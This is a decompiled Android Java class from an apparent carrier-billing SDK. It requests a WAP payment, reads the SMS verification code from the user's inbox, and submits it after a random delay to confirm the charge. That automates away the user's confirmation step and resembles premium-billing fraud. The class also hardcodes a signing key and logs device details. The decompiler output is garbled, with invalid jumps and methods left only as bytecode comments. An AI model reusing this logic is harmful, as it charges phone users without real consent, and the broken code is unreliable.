package com.upay.billing.engine.zcwap;

import android.content.Context;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Build.VERSION;
import android.util.Log;
import com.upay.billing.UpayActivity;
import com.upay.billing.UpayCore;
import com.upay.billing.bean.Cmd;
import com.upay.billing.bean.Cooldown;
import com.upay.billing.bean.Plan;
import com.upay.billing.bean.Trade;
import com.upay.billing.engine.UpayCoreImpl;
import com.upay.billing.utils.Json;
import com.upay.billing.utils.Util;
import java.io.File;
import java.util.List;
import org.json.JSONObject;

public class ZcWapPayTask
  extends AsyncTask
{
  private static final String TAG = "ZcWapPayTask";
  private String app = null;
  private String charge_request;
  private List<Cmd> cmds;
  private String code = null;
  private String exec_request;
  private String key = null;
  private Context mContext;
  private Trade mTrade;
  private String pid = null;
  private int reConnectionZcrespTag = 1;
  private int reconnectionZcOrYgTag = 1;
  private int reconnectionZcTag = 1;
  private String requestZcStr = null;
  private String response = null;
  private String responseStr = null;
  private int resultCode;
  private String urlZcRequest = null;
  
  public ZcWapPayTask(Context paramContext, Trade paramTrade, List<Cmd> paramList)
  {
    this.mContext = paramContext;
    this.mTrade = paramTrade;
    this.cmds = paramList;
    paramTrade = (Cmd)paramList.get(0);
    if (paramTrade.msg.trim().startsWith("{"))
    {
      paramTrade = Json.parse(paramTrade.msg);
      if (Util.empty(paramTrade.getStr("app"))) {
        break label190;
      }
      paramList = paramTrade.getStr("app");
      label127:
      this.app = paramList;
      if (Util.empty(paramTrade.getStr("pid"))) {
        break label207;
      }
      paramList = paramTrade.getStr("pid");
      label151:
      this.pid = paramList;
      if (Util.empty(paramTrade.getStr("key"))) {
        break label224;
      }
    }
    label190:
    label207:
    label224:
    for (paramContext = paramTrade.getStr("key");; paramContext = UpayCore.getInstance(paramContext).getPropString("zcwap", "key", "ff712db123dddcbdaa8f10910cbab5df"))
    {
      this.key = paramContext;
      return;
      paramTrade = Json.parse("{}");
      break;
      paramList = UpayCore.getInstance(paramContext).getPropString("zcwap", "app", "cm");
      break label127;
      paramList = UpayCore.getInstance(paramContext).getPropString("zcwap", "pid", "6001");
      break label151;
    }
  }
  
  protected Object doInBackground(Object... paramVarArgs)
  {
    paramVarArgs = UpayCore.getInstance(this.mContext).getPlan(this.mTrade.appKey);
    if (showLoading(this.mTrade.appKey)) {
      showProgressUi(paramVarArgs, this.mTrade, "upay_progress_ui", UpayCore.getInstance(this.mContext).getPropString("zcwap", "tip_read_sms", "正在等待下发短信验证码，本应用将会访问您的短信收件箱以读取验证码."));
    }
    this.urlZcRequest = requestZc();
    Object localObject;
    try
    {
      localObject = Json.parse(this.urlZcRequest);
      this.resultCode = ((Json)localObject).getInt("resultCode");
      localObject = ((Json)localObject).getStr("orderid");
      Log.i("ZcWapPayTask", "zcresultCode=" + this.resultCode);
      if (this.resultCode != 200000) {
        return "verifyfail";
      }
    }
    catch (Exception paramVarArgs)
    {
      UpayCore.getInstance(this.mContext).logEvent(this.mTrade.appKey, "exception_info", Json.createObject(new Object[] { "message", paramVarArgs.getMessage(), "version", "android " + Build.VERSION.RELEASE + " sdk=" + Build.VERSION.SDK_INT, "ts", Long.valueOf(Util.getTs() + Util.getLong(this.mContext, "Time-Diff")), "stack_trace", paramVarArgs.getMessage(), "model", Util.ifEmpty(Build.MODEL, "unknown"), "package_name", "", "net", Util.getNetType(this.mContext) }).asObject().toString());
      return "analysisfail";
    }
    UpayCore.getInstance(this.mContext).logEvent(this.mTrade.appKey, "exec_pay", Json.createObject(new Object[] { "trade_id", this.mTrade.id, "goods_key", this.mTrade.goodsKey, "cmd_key", ((Cmd)this.cmds.get(0)).key, "bt_key", ((Cmd)this.cmds.get(0)).btKey, "target", ((Cmd)this.cmds.get(0)).num, "sn", this.mTrade.id + "01", "request", ((Cmd)this.cmds.get(0)).msg, "response", "zc-wap", "ts", Long.valueOf(Util.getTs() + Util.getLong(this.mContext, "Time-Diff")), "result", String.valueOf(200), "price", Integer.valueOf(this.mTrade.price) }).asObject().toString());
    int i = 30;
    boolean[] arrayOfBoolean = new boolean[1];
    arrayOfBoolean[0] = false;
    for (;;)
    {
      int j = i - 1;
      if ((i > 0) && (arrayOfBoolean[0] == 0)) {}
      try
      {
        Thread.sleep(3000L);
        String str = Util.getString(this.mContext, "verifycode");
        if ((str != null) && (!"".equals(str))) {
          arrayOfBoolean[0] = true;
        }
        i = j;
        continue;
        if (j < 0) {
          return "verifyfail";
        }
        if (showLoading(this.mTrade.appKey))
        {
          UpayActivity.finish(this.mContext, "upay_progress_ui");
          showProgressUi(paramVarArgs, this.mTrade, "upay_progress_ui", UpayCore.getInstance(this.mContext).getPropString("zcwap", "tip_confirm_sms", "正在提交验证码，请稍后..."));
        }
        l = ZcConstant.getRandom(6, 8) * 1000;
      }
      catch (InterruptedException localInterruptedException)
      {
        try
        {
          long l;
          Thread.sleep(l);
          this.urlZcRequest = getZcPay((String)localObject);
          try
          {
            this.code = Json.parse(this.urlZcRequest).getStr("resultCode");
            Log.i("ZcWapPayTask", "code=" + this.code);
            if (!this.code.equals("200000")) {
              return "payfail";
            }
          }
          catch (Exception paramVarArgs)
          {
            return "payfail";
          }
          this.urlZcRequest = "paysuccess";
          return this.urlZcRequest;
          localInterruptedException = localInterruptedException;
        }
        catch (InterruptedException paramVarArgs)
        {
          for (;;) {}
        }
      }
    }
  }
  
  /* Error */
  public String getZcPay(String paramString)
  {
    // Byte code:
    //   0: ldc_w 374
    //   3: ldc_w 376
    //   6: invokestatic 188	android/util/Log:i	(Ljava/lang/String;Ljava/lang/String;)I
    //   9: pop
    //   10: new 378	java/util/ArrayList
    //   13: dup
    //   14: invokespecial 379	java/util/ArrayList:<init>	()V
    //   17: astore_2
    //   18: aload_0
    //   19: getfield 59	com/upay/billing/engine/zcwap/ZcWapPayTask:mContext	Landroid/content/Context;
    //   22: invokestatic 382	com/upay/billing/engine/zcwap/ZcConstant:time	(Landroid/content/Context;)Ljava/lang/String;
    //   25: astore_3
    //   26: aload_2
    //   27: new 384	org/apache/http/message/BasicNameValuePair
    //   30: dup
    //   31: ldc 93
    //   33: aload_0
    //   34: getfield 51	com/upay/billing/engine/zcwap/ZcWapPayTask:app	Ljava/lang/String;
    //   37: invokespecial 387	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   40: invokeinterface 390 2 0
    //   45: pop
    //   46: aload_2
    //   47: new 384	org/apache/http/message/BasicNameValuePair
    //   50: dup
    //   51: ldc 103
    //   53: aload_0
    //   54: getfield 53	com/upay/billing/engine/zcwap/ZcWapPayTask:pid	Ljava/lang/String;
    //   57: invokespecial 387	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   60: invokeinterface 390 2 0
    //   65: pop
    //   66: aload_2
    //   67: new 384	org/apache/http/message/BasicNameValuePair
    //   70: dup
    //   71: ldc -89
    //   73: aload_1
    //   74: invokespecial 387	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   77: invokeinterface 390 2 0
    //   82: pop
    //   83: aload_2
    //   84: new 384	org/apache/http/message/BasicNameValuePair
    //   87: dup
    //   88: ldc_w 332
    //   91: aload_0
    //   92: getfield 59	com/upay/billing/engine/zcwap/ZcWapPayTask:mContext	Landroid/content/Context;
    //   95: ldc_w 332
    //   98: invokestatic 336	com/upay/billing/utils/Util:getString	(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;
    //   101: invokespecial 387	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   104: invokeinterface 390 2 0
    //   109: pop
    //   110: aload_2
    //   111: new 384	org/apache/http/message/BasicNameValuePair
    //   114: dup
    //   115: ldc_w 391
    //   118: aload_3
    //   119: invokespecial 387	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   122: invokeinterface 390 2 0
    //   127: pop
    //   128: aload_2
    //   129: new 384	org/apache/http/message/BasicNameValuePair
    //   132: dup
    //   133: ldc_w 393
    //   136: aload_0
    //   137: aload_0
    //   138: getfield 51	com/upay/billing/engine/zcwap/ZcWapPayTask:app	Ljava/lang/String;
    //   141: aload_0
    //   142: getfield 53	com/upay/billing/engine/zcwap/ZcWapPayTask:pid	Ljava/lang/String;
    //   145: aload_3
    //   146: aload_0
    //   147: getfield 55	com/upay/billing/engine/zcwap/ZcWapPayTask:key	Ljava/lang/String;
    //   150: invokevirtual 396	com/upay/billing/engine/zcwap/ZcWapPayTask:sign	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   153: iconst_0
    //   154: invokestatic 400	com/upay/billing/utils/Util:md5	(Ljava/lang/String;Z)Ljava/lang/String;
    //   157: invokespecial 387	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   160: invokeinterface 390 2 0
    //   165: pop
    //   166: aload_2
    //   167: ldc_w 402
    //   170: invokestatic 408	org/apache/http/client/utils/URLEncodedUtils:format	(Ljava/util/List;Ljava/lang/String;)Ljava/lang/String;
    //   173: astore_2
    //   174: aload_0
    //   175: getfield 59	com/upay/billing/engine/zcwap/ZcWapPayTask:mContext	Landroid/content/Context;
    //   178: invokestatic 112	com/upay/billing/UpayCore:getInstance	(Landroid/content/Context;)Lcom/upay/billing/UpayCore;
    //   181: ldc 114
    //   183: ldc_w 410
    //   186: getstatic 413	com/upay/billing/engine/zcwap/ZcConstant:zcConfirm	Ljava/lang/String;
    //   189: invokevirtual 120	com/upay/billing/UpayCore:getPropString	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   192: astore_3
    //   193: new 415	org/apache/http/client/methods/HttpGet
    //   196: dup
    //   197: new 169	java/lang/StringBuilder
    //   200: dup
    //   201: invokespecial 170	java/lang/StringBuilder:<init>	()V
    //   204: aload_3
    //   205: invokevirtual 176	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   208: ldc_w 417
    //   211: invokevirtual 176	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   214: aload_2
    //   215: invokevirtual 176	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   218: invokevirtual 182	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   221: invokespecial 420	org/apache/http/client/methods/HttpGet:<init>	(Ljava/lang/String;)V
    //   224: astore_2
    //   225: new 422	org/apache/http/impl/client/DefaultHttpClient
    //   228: dup
    //   229: invokespecial 423	org/apache/http/impl/client/DefaultHttpClient:<init>	()V
    //   232: astore_3
    //   233: aload_3
    //   234: invokeinterface 429 1 0
    //   239: ldc_w 431
    //   242: sipush 30000
    //   245: invokestatic 322	java/lang/Integer:valueOf	(I)Ljava/lang/Integer;
    //   248: invokeinterface 437 3 0
    //   253: pop
    //   254: aload_3
    //   255: invokeinterface 429 1 0
    //   260: ldc_w 439
    //   263: sipush 30000
    //   266: invokestatic 322	java/lang/Integer:valueOf	(I)Ljava/lang/Integer;
    //   269: invokeinterface 437 3 0
    //   274: pop
    //   275: aload_3
    //   276: aload_2
    //   277: invokeinterface 443 2 0
    //   282: astore_2
    //   283: aload_2
    //   284: invokeinterface 449 1 0
    //   289: invokeinterface 455 1 0
    //   294: sipush 200
    //   297: if_icmpne +89 -> 386
    //   300: new 457	java/io/BufferedReader
    //   303: dup
    //   304: new 459	java/io/InputStreamReader
    //   307: dup
    //   308: aload_2
    //   309: invokeinterface 463 1 0
    //   314: invokeinterface 469 1 0
    //   319: invokespecial 472	java/io/InputStreamReader:<init>	(Ljava/io/InputStream;)V
    //   322: invokespecial 475	java/io/BufferedReader:<init>	(Ljava/io/Reader;)V
    //   325: astore_2
    //   326: new 477	java/lang/StringBuffer
    //   329: dup
    //   330: invokespecial 478	java/lang/StringBuffer:<init>	()V
    //   333: astore_3
    //   334: aload_2
    //   335: invokevirtual 481	java/io/BufferedReader:readLine	()Ljava/lang/String;
    //   338: astore 4
    //   340: aload 4
    //   342: ifnull +24 -> 366
    //   345: aload_3
    //   346: aload 4
    //   348: invokevirtual 484	java/lang/StringBuffer:append	(Ljava/lang/String;)Ljava/lang/StringBuffer;
    //   351: pop
    //   352: goto -18 -> 334
    //   355: astore_2
    //   356: aload_0
    //   357: aload_1
    //   358: invokevirtual 487	com/upay/billing/engine/zcwap/ZcWapPayTask:reGetZcPay	(Ljava/lang/String;)V
    //   361: aload_0
    //   362: getfield 37	com/upay/billing/engine/zcwap/ZcWapPayTask:response	Ljava/lang/String;
    //   365: areturn
    //   366: aload_0
    //   367: aload_3
    //   368: invokevirtual 488	java/lang/StringBuffer:toString	()Ljava/lang/String;
    //   371: putfield 37	com/upay/billing/engine/zcwap/ZcWapPayTask:response	Ljava/lang/String;
    //   374: goto -13 -> 361
    //   377: astore_2
    //   378: aload_0
    //   379: aload_1
    //   380: invokevirtual 487	com/upay/billing/engine/zcwap/ZcWapPayTask:reGetZcPay	(Ljava/lang/String;)V
    //   383: goto -22 -> 361
    //   386: aload_0
    //   387: ldc_w 490
    //   390: putfield 37	com/upay/billing/engine/zcwap/ZcWapPayTask:response	Ljava/lang/String;
    //   393: goto -32 -> 361
    //   396: astore_2
    //   397: aload_0
    //   398: aload_1
    //   399: invokevirtual 487	com/upay/billing/engine/zcwap/ZcWapPayTask:reGetZcPay	(Ljava/lang/String;)V
    //   402: goto -41 -> 361
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	405	0	this	ZcWapPayTask
    //   0	405	1	paramString	String
    //   17	318	2	localObject1	Object
    //   355	1	2	localClientProtocolException	org.apache.http.client.ClientProtocolException
    //   377	1	2	localIllegalStateException	IllegalStateException
    //   396	1	2	localIOException	java.io.IOException
    //   25	343	3	localObject2	Object
    //   338	9	4	str	String
    // Exception table:
    //   from	to	target	type
    //   0	334	355	org/apache/http/client/ClientProtocolException
    //   334	340	355	org/apache/http/client/ClientProtocolException
    //   345	352	355	org/apache/http/client/ClientProtocolException
    //   366	374	355	org/apache/http/client/ClientProtocolException
    //   386	393	355	org/apache/http/client/ClientProtocolException
    //   0	334	377	java/lang/IllegalStateException
    //   334	340	377	java/lang/IllegalStateException
    //   345	352	377	java/lang/IllegalStateException
    //   366	374	377	java/lang/IllegalStateException
    //   386	393	377	java/lang/IllegalStateException
    //   0	334	396	java/io/IOException
    //   334	340	396	java/io/IOException
    //   345	352	396	java/io/IOException
    //   366	374	396	java/io/IOException
    //   386	393	396	java/io/IOException
  }
  
  protected void onPostExecute(Object paramObject)
  {
    super.onPostExecute(paramObject);
    paramObject = paramObject.toString();
    if ("paysuccess".equals(paramObject)) {
      if (!Util.empty(((Cmd)this.cmds.get(0)).cdKey))
      {
        paramObject = UpayCore.getInstance(this.mContext).getCooldown(((Cmd)this.cmds.get(0)).cdKey);
        if (paramObject != null) {
          paramObject.start();
        }
        UpayCoreImpl.updatePaymentHistory(this.mTrade, "sn:" + this.mTrade.id + "01");
        UpayCore.getInstance(this.mContext).paymentCompleted(this.mTrade, 200);
        UpayCore.getInstance(this.mContext).tradeUpdated(this.mTrade, ((Cmd)this.cmds.get(0)).key, 1, 200);
        this.exec_request = String.valueOf(200);
        this.charge_request = String.valueOf(200);
        UpayCore.getInstance(this.mContext).logEvent(this.mTrade.appKey, "charge_handle", Json.createObject(new Object[] { "trade_id", this.mTrade.id, "goods_key", this.mTrade.goodsKey, "cmd_key", ((Cmd)this.cmds.get(0)).key, "bt_key", ((Cmd)this.cmds.get(0)).btKey, "description", "zc-wap", "msg", "", "num", "", "result", this.charge_request, "sn", this.mTrade.id + "01", "ts", Long.valueOf(Util.getTs() + Util.getLong(this.mContext, "Time-Diff")), "price", Integer.valueOf(this.mTrade.price) }).asObject().toString());
        ZcConstant.sp_mr(((Cmd)this.cmds.get(0)).key, this.mTrade.id + "01", String.valueOf(this.mTrade.price), "200");
      }
    }
    for (;;)
    {
      Util.saveString(this.mContext, "verifycode", "");
      UpayActivity.finish(this.mContext, "upay_progress_ui");
      return;
      paramObject = null;
      break;
      if ("payfail".equals(paramObject))
      {
        if ((this.code != null) && (!"".equals(this.code))) {
          UpayCore.getInstance(this.mContext).paymentCompleted(this.mTrade, Integer.valueOf(this.code).intValue());
        }
        for (this.charge_request = this.code;; this.charge_request = String.valueOf(122))
        {
          this.exec_request = String.valueOf(122);
          UpayCore.getInstance(this.mContext).logEvent(this.mTrade.appKey, "charge_handle", Json.createObject(new Object[] { "trade_id", this.mTrade.id, "goods_key", this.mTrade.goodsKey, "cmd_key", ((Cmd)this.cmds.get(0)).key, "bt_key", ((Cmd)this.cmds.get(0)).btKey, "description", "zc-wap-submit-verification-fail：code=" + this.charge_request, "msg", "", "num", "", "result", Integer.valueOf(122), "sn", this.mTrade.id + "01", "ts", Long.valueOf(Util.getTs() + Util.getLong(this.mContext, "Time-Diff")), "price", Integer.valueOf(this.mTrade.price) }).asObject().toString());
          break;
          UpayCore.getInstance(this.mContext).paymentCompleted(this.mTrade, 122);
        }
      }
      if ("verifyfail".equals(paramObject))
      {
        if (this.resultCode != 200000)
        {
          UpayCore.getInstance(this.mContext).paymentCompleted(this.mTrade, this.resultCode);
          this.exec_request = String.valueOf(this.resultCode);
          UpayCore.getInstance(this.mContext).logEvent(this.mTrade.appKey, "exec_pay", Json.createObject(new Object[] { "trade_id", this.mTrade.id, "goods_key", this.mTrade.goodsKey, "cmd_key", ((Cmd)this.cmds.get(0)).key, "bt_key", ((Cmd)this.cmds.get(0)).btKey, "target", ((Cmd)this.cmds.get(0)).num, "sn", this.mTrade.id + "01", "request", ((Cmd)this.cmds.get(0)).msg, "response", "zc-wap-request-verification-code-failed : code=" + this.exec_request, "ts", Long.valueOf(Util.getTs() + Util.getLong(this.mContext, "Time-Diff")), "result", Integer.valueOf(150), "price", Integer.valueOf(this.mTrade.price) }).asObject().toString());
        }
        for (;;)
        {
          this.exec_request = String.valueOf(150);
          this.charge_request = String.valueOf(150);
          break;
          UpayCore.getInstance(this.mContext).paymentCompleted(this.mTrade, 150);
          this.exec_request = String.valueOf(150);
          UpayCore.getInstance(this.mContext).logEvent(this.mTrade.appKey, "charge_handle", Json.createObject(new Object[] { "trade_id", this.mTrade.id, "goods_key", this.mTrade.goodsKey, "cmd_key", ((Cmd)this.cmds.get(0)).key, "bt_key", ((Cmd)this.cmds.get(0)).btKey, "description", "zc-wap-get-verification-code-failed : code=" + this.charge_request, "msg", "", "num", "", "result", this.exec_request, "sn", this.mTrade.id + "01", "ts", Long.valueOf(Util.getTs() + Util.getLong(this.mContext, "Time-Diff")), "price", Integer.valueOf(this.mTrade.price) }).asObject().toString());
        }
      }
      if ("nonumber".equals(paramObject))
      {
        UpayCore.getInstance(this.mContext).paymentCompleted(this.mTrade, 151);
        this.exec_request = String.valueOf(151);
        this.charge_request = String.valueOf(151);
        UpayCore.getInstance(this.mContext).logEvent(this.mTrade.appKey, "exec_pay", Json.createObject(new Object[] { "trade_id", this.mTrade.id, "goods_key", this.mTrade.goodsKey, "cmd_key", ((Cmd)this.cmds.get(0)).key, "bt_key", ((Cmd)this.cmds.get(0)).btKey, "target", ((Cmd)this.cmds.get(0)).num, "sn", this.mTrade.id + "01", "request", ((Cmd)this.cmds.get(0)).msg, "response", "zc-wap-access-to-mobile-phone-number-failed ：code=" + this.exec_request, "ts", Long.valueOf(Util.getTs() + Util.getLong(this.mContext, "Time-Diff")), "result", this.exec_request, "price", Integer.valueOf(this.mTrade.price) }).asObject().toString());
      }
      else if ("timeout".equals(paramObject))
      {
        UpayCore.getInstance(this.mContext).paymentCompleted(this.mTrade, 104);
        this.exec_request = String.valueOf(104);
        this.charge_request = String.valueOf(104);
      }
      else if ("analysisfail".equals(paramObject))
      {
        UpayCore.getInstance(this.mContext).paymentCompleted(this.mTrade, 150);
        this.exec_request = String.valueOf(150);
        UpayCore.getInstance(this.mContext).logEvent(this.mTrade.appKey, "exec_pay", Json.createObject(new Object[] { "trade_id", this.mTrade.id, "goods_key", this.mTrade.goodsKey, "cmd_key", ((Cmd)this.cmds.get(0)).key, "bt_key", ((Cmd)this.cmds.get(0)).btKey, "target", ((Cmd)this.cmds.get(0)).num, "sn", this.mTrade.id + "01", "request", ((Cmd)this.cmds.get(0)).msg, "response", "zc-wap-request-return-value-fail:code=" + this.exec_request + ",zc_request_value=" + this.urlZcRequest, "ts", Long.valueOf(Util.getTs() + Util.getLong(this.mContext, "Time-Diff")), "result", this.exec_request, "price", Integer.valueOf(this.mTrade.price) }).asObject().toString());
      }
    }
  }
  
  protected void onPreExecute()
  {
    super.onPreExecute();
  }
  
  public void reGetZcPay(String paramString)
  {
    if (this.reConnectionZcrespTag < 4)
    {
      Log.i("ZcWapPayTask", "reconnection:" + this.reConnectionZcrespTag);
      this.reConnectionZcrespTag += 1;
      getZcPay(paramString);
      return;
    }
    this.response = "timeout";
  }
  
  public void reRequestZc()
  {
    if (this.reconnectionZcTag < 4)
    {
      Log.i("ZcWapPayTask", "reconnection:" + this.reconnectionZcTag);
      this.reconnectionZcTag += 1;
      requestZc();
      return;
    }
    this.requestZcStr = "timeout";
  }
  
  /* Error */
  public String requestZc()
  {
    // Byte code:
    //   0: ldc 8
    //   2: ldc_w 571
    //   5: invokestatic 188	android/util/Log:i	(Ljava/lang/String;Ljava/lang/String;)I
    //   8: pop
    //   9: new 378	java/util/ArrayList
    //   12: dup
    //   13: invokespecial 379	java/util/ArrayList:<init>	()V
    //   16: astore_1
    //   17: aload_0
    //   18: getfield 59	com/upay/billing/engine/zcwap/ZcWapPayTask:mContext	Landroid/content/Context;
    //   21: invokestatic 382	com/upay/billing/engine/zcwap/ZcConstant:time	(Landroid/content/Context;)Ljava/lang/String;
    //   24: astore_2
    //   25: aload_1
    //   26: new 384	org/apache/http/message/BasicNameValuePair
    //   29: dup
    //   30: ldc 93
    //   32: aload_0
    //   33: getfield 51	com/upay/billing/engine/zcwap/ZcWapPayTask:app	Ljava/lang/String;
    //   36: invokespecial 387	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   39: invokeinterface 390 2 0
    //   44: pop
    //   45: aload_1
    //   46: new 384	org/apache/http/message/BasicNameValuePair
    //   49: dup
    //   50: ldc 103
    //   52: aload_0
    //   53: getfield 53	com/upay/billing/engine/zcwap/ZcWapPayTask:pid	Ljava/lang/String;
    //   56: invokespecial 387	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   59: invokeinterface 390 2 0
    //   64: pop
    //   65: aload_1
    //   66: new 384	org/apache/http/message/BasicNameValuePair
    //   69: dup
    //   70: ldc_w 573
    //   73: aload_0
    //   74: getfield 61	com/upay/billing/engine/zcwap/ZcWapPayTask:mTrade	Lcom/upay/billing/bean/Trade;
    //   77: getfield 317	com/upay/billing/bean/Trade:price	I
    //   80: invokestatic 313	java/lang/String:valueOf	(I)Ljava/lang/String;
    //   83: invokespecial 387	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   86: invokeinterface 390 2 0
    //   91: pop
    //   92: aload_1
    //   93: new 384	org/apache/http/message/BasicNameValuePair
    //   96: dup
    //   97: ldc_w 391
    //   100: aload_2
    //   101: invokespecial 387	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   104: invokeinterface 390 2 0
    //   109: pop
    //   110: aload_1
    //   111: new 384	org/apache/http/message/BasicNameValuePair
    //   114: dup
    //   115: ldc_w 393
    //   118: aload_0
    //   119: aload_0
    //   120: getfield 51	com/upay/billing/engine/zcwap/ZcWapPayTask:app	Ljava/lang/String;
    //   123: aload_0
    //   124: getfield 53	com/upay/billing/engine/zcwap/ZcWapPayTask:pid	Ljava/lang/String;
    //   127: aload_2
    //   128: aload_0
    //   129: getfield 55	com/upay/billing/engine/zcwap/ZcWapPayTask:key	Ljava/lang/String;
    //   132: invokevirtual 396	com/upay/billing/engine/zcwap/ZcWapPayTask:sign	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   135: iconst_0
    //   136: invokestatic 400	com/upay/billing/utils/Util:md5	(Ljava/lang/String;Z)Ljava/lang/String;
    //   139: invokespecial 387	org/apache/http/message/BasicNameValuePair:<init>	(Ljava/lang/String;Ljava/lang/String;)V
    //   142: invokeinterface 390 2 0
    //   147: pop
    //   148: aload_0
    //   149: getfield 59	com/upay/billing/engine/zcwap/ZcWapPayTask:mContext	Landroid/content/Context;
    //   152: invokestatic 112	com/upay/billing/UpayCore:getInstance	(Landroid/content/Context;)Lcom/upay/billing/UpayCore;
    //   155: ldc 114
    //   157: ldc_w 575
    //   160: getstatic 578	com/upay/billing/engine/zcwap/ZcConstant:zcRequest	Ljava/lang/String;
    //   163: invokevirtual 120	com/upay/billing/UpayCore:getPropString	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   166: astore_2
    //   167: aload_1
    //   168: ldc_w 402
    //   171: invokestatic 408	org/apache/http/client/utils/URLEncodedUtils:format	(Ljava/util/List;Ljava/lang/String;)Ljava/lang/String;
    //   174: astore_1
    //   175: new 415	org/apache/http/client/methods/HttpGet
    //   178: dup
    //   179: new 169	java/lang/StringBuilder
    //   182: dup
    //   183: invokespecial 170	java/lang/StringBuilder:<init>	()V
    //   186: aload_2
    //   187: invokevirtual 176	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   190: ldc_w 417
    //   193: invokevirtual 176	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   196: aload_1
    //   197: invokevirtual 176	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   200: invokevirtual 182	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   203: invokespecial 420	org/apache/http/client/methods/HttpGet:<init>	(Ljava/lang/String;)V
    //   206: astore_1
    //   207: new 422	org/apache/http/impl/client/DefaultHttpClient
    //   210: dup
    //   211: invokespecial 423	org/apache/http/impl/client/DefaultHttpClient:<init>	()V
    //   214: astore_2
    //   215: aload_2
    //   216: invokeinterface 429 1 0
    //   221: ldc_w 431
    //   224: sipush 30000
    //   227: invokestatic 322	java/lang/Integer:valueOf	(I)Ljava/lang/Integer;
    //   230: invokeinterface 437 3 0
    //   235: pop
    //   236: aload_2
    //   237: invokeinterface 429 1 0
    //   242: ldc_w 439
    //   245: sipush 30000
    //   248: invokestatic 322	java/lang/Integer:valueOf	(I)Ljava/lang/Integer;
    //   251: invokeinterface 437 3 0
    //   256: pop
    //   257: aload_2
    //   258: aload_1
    //   259: invokeinterface 443 2 0
    //   264: astore_1
    //   265: aload_1
    //   266: invokeinterface 449 1 0
    //   271: invokeinterface 455 1 0
    //   276: sipush 200
    //   279: if_icmpne +84 -> 363
    //   282: new 457	java/io/BufferedReader
    //   285: dup
    //   286: new 459	java/io/InputStreamReader
    //   289: dup
    //   290: aload_1
    //   291: invokeinterface 463 1 0
    //   296: invokeinterface 469 1 0
    //   301: invokespecial 472	java/io/InputStreamReader:<init>	(Ljava/io/InputStream;)V
    //   304: invokespecial 475	java/io/BufferedReader:<init>	(Ljava/io/Reader;)V
    //   307: astore_1
    //   308: new 477	java/lang/StringBuffer
    //   311: dup
    //   312: invokespecial 478	java/lang/StringBuffer:<init>	()V
    //   315: astore_2
    //   316: aload_1
    //   317: invokevirtual 481	java/io/BufferedReader:readLine	()Ljava/lang/String;
    //   320: astore_3
    //   321: aload_3
    //   322: ifnull +22 -> 344
    //   325: aload_2
    //   326: aload_3
    //   327: invokevirtual 484	java/lang/StringBuffer:append	(Ljava/lang/String;)Ljava/lang/StringBuffer;
    //   330: pop
    //   331: goto -15 -> 316
    //   334: astore_1
    //   335: aload_0
    //   336: invokevirtual 580	com/upay/billing/engine/zcwap/ZcWapPayTask:reRequestZc	()V
    //   339: aload_0
    //   340: getfield 47	com/upay/billing/engine/zcwap/ZcWapPayTask:requestZcStr	Ljava/lang/String;
    //   343: areturn
    //   344: aload_0
    //   345: aload_2
    //   346: invokevirtual 488	java/lang/StringBuffer:toString	()Ljava/lang/String;
    //   349: putfield 47	com/upay/billing/engine/zcwap/ZcWapPayTask:requestZcStr	Ljava/lang/String;
    //   352: goto -13 -> 339
    //   355: astore_1
    //   356: aload_0
    //   357: invokevirtual 580	com/upay/billing/engine/zcwap/ZcWapPayTask:reRequestZc	()V
    //   360: goto -21 -> 339
    //   363: aload_0
    //   364: ldc_w 490
    //   367: putfield 47	com/upay/billing/engine/zcwap/ZcWapPayTask:requestZcStr	Ljava/lang/String;
    //   370: goto -31 -> 339
    //   373: astore_1
    //   374: aload_0
    //   375: invokevirtual 580	com/upay/billing/engine/zcwap/ZcWapPayTask:reRequestZc	()V
    //   378: goto -39 -> 339
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	381	0	this	ZcWapPayTask
    //   16	301	1	localObject1	Object
    //   334	1	1	localClientProtocolException	org.apache.http.client.ClientProtocolException
    //   355	1	1	localIllegalStateException	IllegalStateException
    //   373	1	1	localIOException	java.io.IOException
    //   24	322	2	localObject2	Object
    //   320	7	3	str	String
    // Exception table:
    //   from	to	target	type
    //   0	316	334	org/apache/http/client/ClientProtocolException
    //   316	321	334	org/apache/http/client/ClientProtocolException
    //   325	331	334	org/apache/http/client/ClientProtocolException
    //   344	352	334	org/apache/http/client/ClientProtocolException
    //   363	370	334	org/apache/http/client/ClientProtocolException
    //   0	316	355	java/lang/IllegalStateException
    //   316	321	355	java/lang/IllegalStateException
    //   325	331	355	java/lang/IllegalStateException
    //   344	352	355	java/lang/IllegalStateException
